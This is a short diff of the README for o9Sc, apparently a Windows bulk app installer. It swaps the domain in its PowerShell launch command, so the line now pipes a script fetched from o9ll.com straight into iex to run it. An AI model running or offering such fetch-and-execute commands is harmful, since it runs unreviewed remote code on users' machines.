@@ -36,7 +36,7 @@ The Browse Apps section in o9Sc makes it easy to bulk install all your essential
 🖥️ **Launch Command**:
 
 ```
-irm "https://o9-9.com/irm" | iex
+irm "https://o9ll.com/irm" | iex
 ```
 
 🖥️ **Via Winget**:
